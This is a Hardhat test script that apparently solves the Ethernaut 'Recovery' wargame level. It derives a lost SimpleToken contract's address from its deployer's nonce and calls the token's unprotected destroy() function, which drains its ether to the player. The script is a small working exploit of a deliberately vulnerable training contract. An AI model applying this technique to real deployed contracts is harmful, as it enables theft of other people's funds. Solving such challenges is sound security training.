const { expect } = require("chai")
const { createChallenge, submitLevel } = require("./utils")

let s1, attacker, challenge, tx

before(async () => {
    ;[s1, s2] = await ethers.getSigners()
    const challengeAddress = await createChallenge(
        "0xAF98ab8F2e2B24F42C661ed023237f5B7acAB048",
        ethers.utils.parseEther("0.001")
    )
    challenge = await ethers.getContractAt("Recovery", challengeAddress)
})

it("solves the challenge", async function () {
    //we can calculate a contract address from the deployer address and the nonce => as we are on a local HH node, our nonce is 1
    //when we created our challenge instance, a "SimpleToken" instance was outomatically created for us =>
    //so, the challenge instance is the deployer of the token
    const from = challenge.address
    const nonce = 1
    let simpleTokenAddress = ethers.utils.getContractAddress({ from, nonce })

    //we can attach the deployed contract to our SimpleToken instance
    const simpleTokenFactory = await ethers.getContractFactory("SimpleToken")
    let simpleToken = await simpleTokenFactory.attach(simpleTokenAddress)

    tx = await simpleToken.destroy(s1.address)
    await tx.wait()
})

after(async () => {
    expect(await submitLevel(challenge.address), "level not solved").to.be.true
})
